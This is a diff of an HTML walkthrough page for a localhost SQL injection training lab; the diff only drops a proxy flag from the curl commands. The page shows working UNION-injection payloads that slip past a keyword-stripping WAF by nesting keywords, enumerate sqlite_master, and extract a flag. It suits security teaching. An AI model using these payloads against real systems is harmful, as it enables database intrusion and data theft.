@@ -9,7 +9,7 @@
         <span class="terminal-title">Step 1. Normal Search</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=a"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=a"<br>
         <span class="prompt">SQL: </span>SELECT id, keyword, description FROM search_data WHERE keyword LIKE '%a%'<br><br>
         <span class="prompt">Output:</span><br>
         id | keyword | description<br>
@@ -30,7 +30,7 @@
         <span class="terminal-title">Step 2. WAF in Action</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNION SELECT 1,2,3 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNION SELECT 1,2,3 -- -"<br>
         <span class="prompt">WAF Raw:      </span>' UNION SELECT 1,2,3 -- -<br>
         <span class="prompt">WAF Filtered: </span>'   1,2,3 -- -<br>
         <span class="prompt">Error: </span><strong>SQLite Error: near "1": syntax error</strong><br><br>
@@ -70,7 +70,7 @@
         <span class="terminal-title">Step 4. WAF Bypass Confirmed</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT 1,2,3 -- -"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT 1,2,3 -- -"<br>
         <span class="prompt">WAF Raw:      </span>' UNUNIONION SELSELECTECT 1,2,3 -- -<br>
         <span class="prompt">WAF Filtered: </span>' UNION SELECT 1,2,3 -- -<br><br>
         <span class="prompt">Output:</span><br>
@@ -94,7 +94,7 @@
         <span class="terminal-title">Step 5. Table Discovery</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT name, sql, type FRFROMOM sqlite_master -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT name, sql, type FRFROMOM sqlite_master -- -"<br><br>
         <span class="prompt">Output:</span><br>
         id | keyword | description<br>
         1 | networking | TCP/IP fundamentals and protocols<br>
@@ -119,7 +119,7 @@
         <span class="terminal-title">Step 6. Flag Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT id, flag_value, 'pwned' FRFROMOM hidden_flags -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT id, flag_value, 'pwned' FRFROMOM hidden_flags -- -"<br><br>
         <span class="prompt">Output:</span><br>
         id | keyword | description<br>
         1 | <strong>FLAG{sq_w4f_n0_st4nd4rd}</strong> | pwned<br>
@@ -145,7 +145,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT id, flag_value, 'pwned' FRFROMOM hidden_flags -- -"
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab10" \<br> --data-urlencode "q=' UNUNIONION SELSELECTECT id, flag_value, 'pwned' FRFROMOM hidden_flags -- -"
     </div>
 </div>
 
